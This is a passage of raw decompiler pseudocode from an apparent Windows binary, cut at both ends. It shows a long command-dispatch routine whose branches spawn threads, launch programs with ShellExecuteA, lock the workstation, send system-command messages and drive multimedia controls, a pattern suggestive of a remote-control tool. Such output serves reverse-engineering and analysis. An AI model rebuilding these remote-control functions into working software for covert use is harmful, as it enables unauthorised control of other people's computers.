1;\n        var_424h = 0x478db5;\n        fcn.00405a44();\n        var_424h = 0x478dc2;\n        fcn.00405b28();\n        var_424h = 0x478dd1;\n        fcn.00405a84();\n        var_424h = 0x478ddc;\n        fcn.004055c8();\n        var_424h = 0x478de7;\n        fcn.004055c8();\n        var_424h = 0x478df9;\n        fcn.00405a84();\n        var_424h = &fcn.00476010::var_ch;\n        var_428h = 0x478e0f;\n        fcn.00405a44();\n        var_428h = 0x47dd14;\n        var_42ch = var_14h;\n        var_430h = 0x47dd14;\n        var_434h = 0x478e2c;\n        fcn.004058e0();\n        var_434h = 0x478e3d;\n        fcn.0047002c();\n    }\n    var_434h = 0x478e4a;\n    fcn.00405974();\n    if (uVar11) {\n        var_434h = 0x478e51;\n        fcn.0047010c();\n    }\n    var_434h = &fcn.00476010::var_468h;\n    var_438h = 0x478e6a;\n    fcn.00405a44();\n    var_438h = 0x478e7a;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x478e92;\n        fcn.00405a84();\n        var_438h = &fcn.00476010::var_ch;\n        var_43ch = 0x478ea3;\n        fcn.00405b28();\n        var_43ch = 0x478eb3;\n        fcn.00405a44();\n        var_43ch = 0x478ec0;\n        fcn.00405b28();\n        var_43ch = 0x478ecf;\n        fcn.00405a84();\n        var_43ch = &fcn.00476010::var_10h;\n        var_440h = 0x478ee0;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_440h = 0x478ef0;\n        fcn.00405a44();\n        var_440h = 0x478efd;\n        fcn.00405b28();\n        var_440h = 0x478f0c;\n        fcn.00405a84();\n        var_440h = 0x478f17;\n        fcn.004055c8();\n        var_440h = var_10h;\n        var_444h = 0x478f2b;\n        fcn.0048344c(var_10h);\n    }\n    var_444h = 0x478f38;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x2;\n        var_448h = 0x478f4c;\n        fcn.0045ea60();\n        var_448h = var_46ch;\n        var_44ch = 0x478f58;\n        (**(*var_46ch + 0x74))();\n        var_444h = 0x478f5d;\n        fcn.0040711c();\n    }\n    var_444h = 0x478f6a;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0xa;\n        var_448h = 0x478f7e;\n        fcn.0045ea60();\n        var_448h = var_470h;\n        var_44ch = 0x478f8a;\n        (**(*var_470h + 0x74))();\n        var_444h = 0x478f8f;\n        fcn.0040711c();\n    }\n    var_444h = 0x478f9c;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x22;\n        var_448h = 0x478fb0;\n        fcn.0045ea60();\n        var_448h = var_474h;\n        var_44ch = 0x478fbc;\n        (**(*var_474h + 0x74))();\n        var_444h = 0x478fc1;\n        fcn.0040711c();\n    }\n    var_444h = 0x478fce;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x1;\n        var_448h = 0x478fe2;\n        fcn.0045ea60();\n        var_448h = var_478h;\n        var_44ch = 0x478fee;\n        (**(*var_478h + 0x74))();\n        var_444h = 0x478ff3;\n        fcn.0040711c();\n    }\n    var_444h = 0x479000;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x479012;\n        fcn.0045ea60();\n        var_444h = var_47ch;\n        var_448h = 0x47901e;\n        (**(*var_47ch + 0x3c))();\n        var_444h = 0x479023;\n        fcn.0040711c();\n    }\n    var_444h = 0x479030;\n    fcn.00405974();\n    if (uVar11) {\n        var_444h = 0x479041;\n        var_444h = fcn.00405d28();\n        var_448h = 0x479052;\n        fcn.0045ea60();\n        var_448h = var_484h;\n        var_44ch = 0x479061;\n        (**(*var_484h + 0x90))();\n        var_44ch = 0x479066;\n        fcn.0040711c();\n        var_44ch = 0x479074;\n        fcn.004057d4();\n        var_44ch = 0x47907f;\n        var_44ch = fcn.00405d28();\n        var_450h = 0x479090;\n        fcn.0045ea60();\n        var_450h = var_48ch;\n        var_454h = 0x47909c;\n        (**(*var_48ch + 0x24))();\n        var_454h = 0x4790a1;\n        fcn.0040711c();\n        var_454h = 0x4790af;\n        fcn.004057d4();\n        var_454h = 0x4790b4;\n        cVar1 = fcn.004701f4();\n        if (cVar1 == '\\x01') {\n            var_454h = 0x4790c3;\n            var_454h = fcn.00405d28();\n            var_458h = 0x4790d4;\n            fcn.0045ea60();\n            var_458h = var_494h;\n            var_45ch = 0x4790e0;\n            (**(*var_494h + 0x6c))();\n            var_454h = 0x4790e5;\n            fcn.0040711c();\n            var_454h = 0x4790f3;\n            fcn.004057d4();\n        }\n        var_454h = 0x4790f8;\n        cVar1 = fcn.004701f4();\n        if (cVar1 == '\\x01') {\n            var_454h = 0x479107;\n            var_454h = fcn.00405d28();\n            var_458h = 0x479118;\n            fcn.0045ea60();\n            var_458h = var_49ch;\n            var_45ch = 0x479124;\n            (**(*var_49ch + 0x70))();\n            var_454h = 0x479129;\n            fcn.0040711c();\n            var_454h = 0x479137;\n            fcn.004057d4();\n        }\n        var_454h = 0x479142;\n        var_454h = fcn.00405d28();\n        var_458h = 0x479153;\n        fcn.0045ea60();\n        var_458h = var_4a4h;\n        var_45ch = 0x479162;\n        (**(*var_4a4h + 0x80))();\n        var_414h = 0x479167;\n        fcn.0040711c();\n        var_414h = 0x479175;\n        fcn.004057d4();\n        if (var_ch == NULL) {\n            var_414h = 0x479188;\n            fcn.004055c8();\n        }\n        if (var_10h == NULL) {\n            var_414h = 0x47919b;\n            fcn.004055c8();\n        }\n        if (var_14h == 0) {\n            var_414h = 0x4791ae;\n            fcn.004055c8();\n        }\n        if (var_18h == 0) {\n            var_414h = 0x4791c1;\n            fcn.004055c8();\n        }\n        uVar11 = var_1ch == NULL;\n        if (uVar11) {\n            var_414h = 0x4791d4;\n            fcn.004055c8();\n        }\n        var_414h = 0x47ddd4;\n        var_418h = var_ch;\n        var_41ch = 0x47d4b4;\n        var_420h = var_10h;\n        var_424h = 0x47d4b4;\n        var_428h = var_14h;\n        var_42ch = 0x47d4b4;\n        var_430h = var_18h;\n        var_434h = 0x47d4b4;\n        var_438h = var_1ch;\n        var_43ch = 0x47d4b4;\n        var_440h = 0x47920c;\n        fcn.00470294();\n        var_440h = var_4ach;\n        var_444h = 0x479222;\n        fcn.004058e0();\n        var_444h = 0x47922d;\n        fcn.00475d98();\n    }\n    var_444h = &fcn.00476010::var_4b0h;\n    var_448h = 0x479246;\n    fcn.00405a44();\n    var_448h = 0x479256;\n    fcn.00405974();\n    if (uVar11) {\n        var_448h = 0x47926e;\n        fcn.00405a84();\n        var_448h = &fcn.00476010::var_ch;\n        var_44ch = 0x47927f;\n        fcn.00405b28();\n        var_44ch = 0x47928f;\n        fcn.00405a44();\n        var_44ch = 0x47929c;\n        fcn.00405b28();\n        var_44ch = 0x4792ab;\n        fcn.00405a84();\n        var_44ch = &fcn.00476010::var_10h;\n        var_450h = 0x4792bc;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_450h = 0x4792cc;\n        fcn.00405a44();\n        var_450h = 0x4792d9;\n        fcn.00405b28();\n        var_450h = 0x4792e8;\n        fcn.00405a84();\n        var_450h = 0x4792f3;\n        fcn.004055c8();\n        var_454h = 0x4792ff;\n        var_450h = &stack0xfffffffc;\n        fcn.00470518();\n        var_454h = 0x479310;\n        fcn.00475f44(var_450h);\n    }\n    var_450h = &fcn.00476010::var_4b8h;\n    var_454h = 0x47932a;\n    fcn.00405a44();\n    var_454h = 0x47933a;\n    fcn.00405974();\n    if (uVar11) {\n        var_454h = 0x47934e;\n        fcn.00405a84();\n        var_454h = 0x479353;\n        cVar1 = fcn.004701f4();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_454h = 0x47935f;\n            fcn.004708a0();\n        }\n    }\n    var_454h = &fcn.00476010::var_4bch;\n    var_458h = 0x479378;\n    fcn.00405a44();\n    var_458h = 0x479388;\n    fcn.00405974();\n    if (uVar11) {\n        var_458h = 0x47939c;\n        fcn.00405a84();\n        var_458h = 0x4793a1;\n        cVar1 = fcn.004701f4();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_458h = 0x4793ad;\n            fcn.00470498();\n        }\n    }\n    var_458h = &fcn.00476010::var_4c0h;\n    var_45ch = 0x4793c6;\n    fcn.00405a44();\n    var_45ch = 0x4793d6;\n    fcn.00405974();\n    if (uVar11) {\n        var_45ch = 0x4793ea;\n        fcn.00405a84();\n        var_45ch = 0x4793ef;\n        cVar1 = fcn.004701f4();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_45ch = 0x4793fb;\n            fcn.004709ec();\n        }\n    }\n    var_45ch = &fcn.00476010::var_4c4h;\n    var_460h = 0x479414;\n    fcn.00405a44();\n    var_460h = 0x479424;\n    fcn.00405974();\n    if (uVar11) {\n        var_460h = 0x479438;\n        fcn.00405a84();\n        var_460h = 0x47943d;\n        cVar1 = fcn.004701f4();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_460h = 0x479449;\n            fcn.00470b38();\n        }\n    }\n    var_460h = &fcn.00476010::var_4c8h;\n    var_464h = 0x479462;\n    fcn.00405a44();\n    var_464h = 0x479472;\n    fcn.00405974();\n    if (uVar11) {\n        var_464h = 0x479486;\n        fcn.00405a84();\n        **0x495a88 = 1;\n        var_464h = *0x495b70;\n        var_468h = 0x4794a4;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_468h = 0x4794b4;\n        fcn.00405a44();\n        var_468h = 0x4794c1;\n        fcn.00405b28();\n        var_468h = 0x4794d0;\n        fcn.00405a84();\n        var_468h = 0x4794dd;\n        fcn.00405584();\n    }\n    var_468h = 0x4794ea;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x495a88 = 0;\n    }\n    var_468h = &fcn.00476010::var_4cch;\n    var_46ch = 0x47950e;\n    fcn.00405a44();\n    var_46ch = 0x47951e;\n    fcn.00405974();\n    if (uVar11) {\n        var_46ch = 0x479536;\n        fcn.00405a84();\n        if (**0x4958f8 == 1) {\n            var_46ch = 0x47954a;\n            fcn.00475d98();\n        }\n        var_46ch = &fcn.00476010::var_ch;\n        var_470h = 0x47955b;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_470h = 0x47956b;\n        fcn.00405a44();\n        var_470h = 0x479578;\n        fcn.00405b28();\n        var_470h = 0x479587;\n        fcn.00405a84();\n        var_470h = 0x479592;\n        fcn.004055c8();\n        var_474h = 0x4795a3;\n        var_470h = &stack0xfffffffc;\n        fcn.0048b61c();\n        var_474h = 0x4795b3;\n        fcn.00405818();\n        var_474h = 0x4795c4;\n        fcn.00481114();\n        var_474h = 0x4795d5;\n        fcn.00475f44(var_470h);\n    }\n    var_470h = 0x4795e3;\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x4958f8 == 1,  !uVar11)) {\n        var_470h = &fcn.00476010::var_4h;\n        var_474h = NULL;\n        var_478h = NULL;\n        var_47ch = 0x4822f8;\n        var_480h = 0;\n        var_484h = NULL;\n        var_488h = 0x479605;\n        sub.kernel32.dll_CreateThread_1();\n        **0x4958f8 = 1;\n    }\n    var_470h = 0x47961d;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x4958f8 = 0;\n    }\n    var_470h = 0x479635;\n    fcn.00405974();\n    if (uVar11) {\n        **0x495a88 = 1;\n    }\n    var_470h = 0x47964f;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x495a88 = 0;\n    }\n    var_470h = &fcn.00476010::var_4d8h;\n    var_474h = 0x479673;\n    fcn.00405a44();\n    var_474h = 0x479683;\n    fcn.00405974();\n    if (uVar11) {\n        var_474h = 0x47969b;\n        fcn.00405a84();\n        var_474h = &fcn.00476010::var_ch;\n        var_478h = 0x4796ac;\n        fcn.00405b28();\n        var_478h = 0x4796bc;\n        fcn.00405a44();\n        var_478h = 0x4796c9;\n        fcn.00405b28();\n        var_478h = 0x4796d8;\n        fcn.00405a84();\n        var_478h = &fcn.00476010::var_10h;\n        var_47ch = 0x4796e9;\n        fcn.00405b28();\n        var_47ch = 0x4796f9;\n        fcn.00405a44();\n        var_47ch = 0x479706;\n        fcn.00405b28();\n        var_47ch = 0x479715;\n        fcn.00405a84();\n        var_47ch = 0x479720;\n        fcn.004055c8();\n        var_47ch = 0x479730;\n        fcn.0048b61c();\n        var_47ch = var_4e0h;\n        var_480h = 0x47debc;\n        var_484h = var_ch;\n        var_488h = 0x47974e;\n        fcn.004058e0();\n        var_488h = 0x479759;\n        cVar1 = fcn.0040a274();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = var_484h;\n            goto code_r0x0047d309;\n        }\n        var_48ch = 0x47977b;\n        var_488h = &stack0xfffffffc;\n        fcn.0048b61c();\n        var_48ch = var_4ech;\n        var_490h = 0x47debc;\n        var_494h = var_ch;\n        var_498h = 0x479799;\n        fcn.004058e0();\n        var_498h = 0x4797aa;\n        fcn.0048b300();\n        var_498h = 0x4797bb;\n        fcn.00475f44(var_494h);\n    }\n    var_494h = 0x4797c9;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x4797d5;\n        fcn.0048a8c0();\n    }\n    var_494h = 0x4797e2;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x4797ee;\n        fcn.0048a8c0();\n    }\n    var_494h = 0x4797fb;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x479807;\n        fcn.0048a8c0();\n    }\n    var_494h = 0x479814;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x479820;\n        fcn.0048a8c0();\n    }\n    var_494h = 0x47982d;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = NULL;\n        var_498h = 0xf140;\n        var_49ch = 0x112;\n        var_4a0h = 0;\n        var_4a4h = 0x479842;\n        sub.user32.dll_SendMessageA();\n    }\n    var_494h = 0x47984f;\n    fcn.00405974();\n    if (uVar11) {\n        var_494h = 0x479856;\n        sub.user32.dll_LockWorkStation();\n    }\n    var_494h = &fcn.00476010::var_4f0h;\n    var_498h = 0x47986f;\n    fcn.00405a44();\n    var_498h = 0x47987f;\n    fcn.00405974();\n    if (uVar11) {\n        var_498h = 0x479897;\n        fcn.00405a84();\n        var_498h = &fcn.00476010::var_10h;\n        var_49ch = 0x4798a8;\n        fcn.00405b28();\n        var_49ch = 0x4798b8;\n        fcn.00405a44();\n        var_49ch = 0x4798c5;\n        fcn.00405b28();\n        var_49ch = 0x4798d4;\n        fcn.00405a84();\n        var_49ch = &fcn.00476010::var_14h;\n        var_4a0h = 0x4798e5;\n        fcn.00405b28();\n        var_4a0h = 0x4798f5;\n        fcn.00405a44();\n        var_4a0h = 0x479902;\n        fcn.00405b28();\n        var_4a0h = 0x479911;\n        fcn.00405a84();\n        var_4a0h = 0x47991c;\n        fcn.004055c8();\n        var_4a0h = 0x47992f;\n        fcn.00405728();\n        var_4a0h = var_4f4h;\n        var_4a4h = 0x47d8e8;\n        var_4a8h = 0x47994d;\n        fcn.00409d78();\n        var_4a8h = var_4f8h;\n        var_4ach = 0x47d8e8;\n        var_4b0h = 0x479963;\n        fcn.0048def4();\n        var_4b0h = var_4fch;\n        var_4b4h = 0x47d8e8;\n        var_4b8h = 0x479979;\n        fcn.0048d700();\n        var_4b8h = var_500h;\n        var_4bch = 0x47d7a4;\n        var_4c0h = 0x47998f;\n        fcn.0048d6c4();\n        var_4c0h = var_504h;\n        var_4c4h = 0x47d8e8;\n        var_4c8h = 0x4799a5;\n        fcn.0048dc14();\n        var_4c8h = var_508h;\n        var_4cch = 0x47d8e8;\n        var_4d0h = 0x4799bb;\n        fcn.0046d408();\n        var_4d0h = var_50ch;\n        var_4d4h = 0x47d8e8;\n        var_4d8h = 0x47dff8;\n        var_4dch = 0x47d8e8;\n        var_4e0h = 0x4799db;\n        fcn.0048d788();\n        var_4e0h = var_510h;\n        var_4e4h = 0x47d8e8;\n        var_4e8h = 0x4799f1;\n        fcn.0048da44();\n        var_4e8h = var_514h;\n        var_4ech = 0x47d8e8;\n        var_4f0h = 0x479a07;\n        fcn.0048da98();\n        var_4f0h = var_518h;\n        var_4f4h = 0x47d8e8;\n        var_4f8h = 0x479a1d;\n        fcn.0048dae8();\n        var_4f8h = var_51ch;\n        var_4fch = 0x47d8e8;\n        var_500h = 0x479a33;\n        fcn.0048db4c();\n        var_500h = var_520h;\n        var_504h = 0x47d8e8;\n        var_508h = 0x479a49;\n        fcn.0048df24();\n        var_508h = var_524h;\n        var_50ch = 0x47d8e8;\n        var_510h = 0x479a5f;\n        fcn.0048df54();\n        var_510h = var_528h;\n        var_514h = 0x47d8e8;\n        var_518h = 0x479a75;\n        fcn.0048e200();\n        var_518h = var_52ch;\n        var_51ch = 0x47d8e8;\n        var_520h = 0x479a8b;\n        fcn.0046dafc();\n        var_520h = 0x479a9c;\n        fcn.0048e298();\n        var_520h = var_530h;\n        var_524h = 0x47d8e8;\n        uVar11 = 1;\n        var_528h = 0x479ab4;\n        fcn.0040f23c();\n        var_528h = var_538h;\n        var_52ch = 0x47d8e8;\n        var_530h = **0x495d3c;\n        var_534h = 0x47d8e8;\n        var_538h = **0x495914;\n        var_53ch = 0x47d8e8;\n        var_540h = 0x479ae7;\n        fcn.00473610();\n        var_540h = 0x479af8;\n        fcn.0048c42c();\n        var_540h = var_53ch;\n        var_544h = 0x47d8e8;\n        var_548h = 0x479b0e;\n        fcn.0048c4bc();\n        var_548h = var_544h;\n        var_54ch = 0x47d8e8;\n        var_550h = 0x479b24;\n        fcn.0048d414();\n        var_550h = var_548h;\n        var_554h = 0x479b37;\n        fcn.004058e0();\n        var_558h = 0x479b46;\n        var_554h = &stack0xfffffffc;\n        fcn.00475f44(&stack0xfffffffc);\n    }\n    var_554h = &fcn.00476010::var_54ch;\n    var_558h = 0x479b60;\n    fcn.00405a44();\n    var_558h = 0x479b70;\n    fcn.00405974();\n    if (uVar11) {\n        var_558h = 0x479b88;\n        fcn.00405a84();\n        var_558h = 0x479b93;\n        fcn.004055c8();\n        uVar11 = **0x495904 == 0;\n        if (!uVar11) {\n            var_558h = 0x479ba9;\n            cVar1 = fcn.004865e0();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                *in_FS_OFFSET = var_554h;\n                goto code_r0x0047d309;\n            }\n        }\n        var_558h = 0x479bc8;\n        iVar4 = fcn.0041f9e0();\n        **0x495904 = iVar4;\n        *(**0x495904 + 0xf) = 1;\n        var_558h = 0x479be9;\n        fcn.0041fbec();\n        var_558h = 0x479bf1;\n        fcn.00409ee4();\n        var_558h = 0x479bff;\n        fcn.00486590();\n        var_558h = 0x479c10;\n        fcn.00486594();\n        var_558h = 0x479c1c;\n        fcn.0041fe9c();\n    }\n    var_558h = &fcn.00476010::var_550h;\n    var_55ch = 0x479c35;\n    fcn.00405a44();\n    var_55ch = 0x479c45;\n    fcn.00405974();\n    if (uVar11) {\n        var_55ch = 0x479c59;\n        fcn.00405a84();\n        var_55ch = 0x5;\n        var_560h = 0;\n        var_564h = 0;\n        var_568h = 0x479c67;\n        var_568h = fcn.004059dc();\n        var_56ch = 0x47d59c;\n        var_570h = NULL;\n        var_574h = 0x479c74;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    var_574h = &fcn.00476010::var_554h;\n    var_578h = 0x479c8d;\n    fcn.00405a44();\n    var_578h = 0x479c9d;\n    fcn.00405974();\n    if (uVar11) {\n        var_578h = 0x479cb5;\n        fcn.00405a84();\n        var_578h = 0x479cc1;\n        var_1a8h = fcn.00404620();\n        var_578h = 0x479cd5;\n        (**(*var_1a8h + 0x2c))();\n        var_57ch = 0x479e52;\n        var_580h = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00476010::var_580h;\n        var_584h = 0x479cee;\n        var_578h = &stack0xfffffffc;\n        iVar4 = (**(*var_1a8h + 0x14))();\n        if (-1 < iVar4 + -1) {\n            do {\n                var_584h = 0x479d0c;\n                (**(*var_1a8h + 0xc))();\n                var_554h = &fcn.00476010::var_ch;\n                var_558h = 0x479d1d;\n                fcn.00405b28();\n                var_558h = 0x479d2d;\n                fcn.00405a44();\n                var_558h = 0x479d3a;\n                fcn.00405b28();\n                var_558h = 0x479d49;\n                fcn.00405a84();\n                var_558h = &fcn.00476010::var_10h;\n                var_55ch = 0x479d5a;\n                fcn.00405b28();\n                var_55ch = 0x479d6a;\n                fcn.00405a44();\n                var_55ch = 0x479d77;\n                fcn.00405b28();\n                var_55ch = 0x479d86;\n                fcn.00405a84();\n                var_55ch = &fcn.00476010::var_14h;\n                var_560h = 0x479d97;\n                fcn.00405b28();\n                var_560h = 0x479da7;\n                fcn.00405a44();\n                var_560h = 0x479db4;\n                fcn.00405b28();\n                var_560h = 0x479dc3;\n                fcn.00405a84();\n                var_560h = 0x479dce;\n                fcn.004055c8();\n                var_560h = 0x10;\n                var_564h = 0x40;\n                var_568h = 0x479dd7;\n                var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n                var_568h = 0x479def;\n                fcn.00405584();\n                var_568h = 0x479dfa;\n                fcn.00405584();\n                var_568h = 0x479e05;\n                fcn.00405584();\n                var_568h = 0x479e10;\n                fcn.00405584();\n                var_568h = &fcn.00476010::var_4h;\n                var_56ch = 0;\n                var_570h = var_1a4h;\n                var_574h = fcn.00475bd4;\n                var_578h = NULL;\n                var_57ch = NULL;\n                var_580h = 0x479e2b;\n                var_580h = sub.kernel32.dll_CreateThread_1();\n                var_584h = 0x479e31;\n                sub.kernel32.dll_CloseHandle_1();\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *in_FS_OFFSET = var_580h;\n        var_578h = 0x479e59;\n        var_57ch = 0x479e51;\n        fcn.00404650();\n        return;\n    }\n    var_578h = &fcn.00476010::var_558h;\n    var_57ch = 0x479e72;\n    fcn.00405a44();\n    var_57ch = 0x479e82;\n    fcn.00405974();\n    if (uVar11) {\n        var_57ch = 0x479e9a;\n        fcn.00405a84();\n        var_57ch = &fcn.00476010::var_ch;\n        var_580h = 0x479eab;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_580h = 0x479ebb;\n        fcn.00405a44();\n        var_580h = 0x479ec8;\n        fcn.00405b28();\n        var_580h = 0x479ed7;\n        fcn.00405a84();\n        var_580h = 0x479ee2;\n        fcn.004055c8();\n        var_580h = 0x10;\n        var_584h = 0x40;\n        var_588h = 0x479eeb;\n        var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n        var_588h = 0x479f03;\n        fcn.00405584();\n        var_588h = 0x479f0e;\n        fcn.00405584();\n        var_588h = 0x479f1b;\n        fcn.00405584();\n        var_588h = 0x479f28;\n        fcn.00405584();\n        var_588h = &fcn.00476010::var_4h;\n        var_58ch = 0;\n        var_590h = var_1a4h;\n        var_594h = fcn.00475bd4;\n        var_598h = 0;\n        var_59ch = 0;\n        var_5a0h = 0x479f43;\n        var_5a0h = sub.kernel32.dll_CreateThread_1();\n        var_5a4h = 0x479f49;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    var_5a4h = &fcn.00476010::var_55ch;\n    var_5a8h = 0x479f62;\n    fcn.00405a44();\n    var_5a8h = 0x479f72;\n    fcn.00405974();\n    if (uVar11) {\n        var_5a8h = 0x479f86;\n        fcn.00405a84();\n        var_5a8h = 0x479f91;\n        fcn.0048a3f0();\n        var_5a8h = 0x479fa1;\n        fcn.00405818();\n        var_5a8h = 0x479faf;\n        fcn.0048b3a8();\n        var_5a8h = 0;\n        var_5ach = 0;\n        uStack1460 = 0;\n        uStack1464 = 0x479fc0;\n        fcn.0048a3f0();\n        uStack1464 = 0x479fd0;\n        fcn.00405818();\n        uStack1464 = 0x479fdb;\n        uStack1464 = fcn.004059dc();\n        uStack1468 = 0x47e09c;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00470c84();\n        if (var_568h != NULL) {\n            fcn.00470c84();\n            fcn.00405864();\n            fcn.00475d98();\n        }\n        fcn.00470cb0();\n        uVar11 = var_574h == NULL;\n        if (!uVar11) {\n            fcn.00470cb0();\n            fcn.00405864();\n            fcn.00475d98();\n        }\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00470c84();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        in_stack_fffffa34 = &fcn.00476010::var_58ch;\n        fcn.0040ef4c(in_stack_fffffa34, *0x47d4b8);\n        fcn.004055c8();\n        fcn.00431a18();\n        fcn.004315a0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        piVar8 = fcn.00431a18();\n        (**(*piVar8 + 0x10))();\n    }\n    fcn.00405a44();\n    puStack1492 = 0x47a171;\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        puStack1492 = &fcn.00476010::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1504 = 0x47a21a;\n        fcn.00470e48();\n        puStack1504 = 0x47a22b;\n        fcn.00475f44(arg_8h_02);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack1504 = 0x47a246;\n        sub.ole32.dll_CoInitialize();\n        piVar8 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffa18;\n        puStack1516 = 0x47a25f;\n        puStack1504 = &stack0xfffffffc;\n        fcn.00464f20();\n        puStack1516 = 0x47a270;\n        fcn.00409b84();\n        if (var_598h != 0) {\n            puStack1516 = 0x47a284;\n            fcn.00464f20();\n            puStack1516 = 0x47a29a;\n            fcn.00405864();\n            puStack1516 = 0x47a2a5;\n            fcn.00475d98();\n        }\n        *in_FS_OFFSET = piVar8;\n        puStack1504 = 0x47a2bf;\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    puStack1504 = 0x47a2d8;\n    fcn.00405a44();\n    puStack1504 = 0x47a2e8;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1504 = 0x47a300;\n        fcn.00405a84();\n        puStack1504 = &fcn.00476010::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1516 = 0x47a391;\n        fcn.0048b464();\n        puStack1516 = 0x47a3a2;\n        fcn.00475f44(arg_8h_01);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dd44();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dd68();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046db6c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dbd0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dc34();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dc78();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dcbc();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046dd00();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004711bc();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00471194();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0047120c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0047120c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0047112c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0047112c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00470ff0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.00470ff0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004711e4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack1516 = NULL;\n        puStack1520 = NULL;\n        uStack1524 = 0x47e34c;\n        uStack1528 = 0x47a522;\n        sub.winmm.dll_mciSendStringA();\n    }\n    puStack1516 = 0x47a53b;\n    fcn.00405a44();\n    puStack1516 = 0x47a54b;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1516 = 0x47a55f;\n        fcn.00405a84();\n        puStack1516 = 0x47a56d;\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        puStack1516 = 0x47a57c;\n        fcn.0041fbec();\n        uVar11 = 1;\n        puStack1516 = 0x47a585;\n        fcn.00486590();\n        puStack1516 = 0x47a58f;\n        fcn.004865e8();\n        puStack1516 = 0x47a59b;\n        fcn.00486594();\n        puStack1516 = 0x47a5a2;\n        fcn.0041fe9c();\n    }\n    puStack1516 = &stack0xfffffa48;\n    puStack1520 = 0x47a5bb;\n    fcn.00405a44();\n    puStack1520 = 0x47a5cb;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1520 = 0x47a5df;\n        fcn.00405a84();\n        puStack1520 = 0x47a5ec;\n        fcn.00405974();\n        if (uVar11) {\n            puStack1520 = 0x47a5f5;\n            fcn.00475980();\n        }\n        else {\n            uVar11 = 1;\n            puStack1520 = 0x47a5fe;\n            fcn.00475980();\n        }\n    }\n    puStack1520 = &stack0xfffffa44;\n    uStack1524 = 0x47a617;\n    fcn.00405a44();\n    uStack1524 = 0x47a627;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1524 = 0x47a63f;\n        fcn.00405a84();\n        uStack1524 = 0x47a64c;\n        fcn.0048a1bc();\n        uStack1524 = 0;\n        uStack1528 = 0;\n        uStack1532 = 